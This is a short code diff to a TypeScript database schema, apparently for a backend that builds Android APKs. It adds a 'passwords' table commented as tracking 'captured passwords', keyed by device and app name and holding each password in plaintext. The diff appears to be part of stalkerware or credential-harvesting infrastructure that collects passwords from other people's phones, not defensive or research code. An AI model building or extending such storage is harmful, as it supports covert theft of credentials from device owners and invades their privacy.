@@ -127,3 +127,17 @@ export const apkBuilds = mysqlTable("apkBuilds", {
 
 export type APKBuild = typeof apkBuilds.$inferSelect;
 export type InsertAPKBuild = typeof apkBuilds.$inferInsert;
+
+// Passwords table for tracking captured passwords
+export const passwords = mysqlTable("passwords", {
+  id: int("id").autoincrement().primaryKey(),
+  deviceId: varchar("deviceId", { length: 64 }).notNull(),
+  userId: int("userId").notNull(),
+  appName: varchar("appName", { length: 255 }).notNull(),
+  password: text("password").notNull(),
+  isDeleted: int("isDeleted").default(0).notNull(),
+  createdAt: timestamp("createdAt").defaultNow().notNull(),
+});
+
+export type Password = typeof passwords.$inferSelect;
+export type InsertPassword = typeof passwords.$inferInsert;
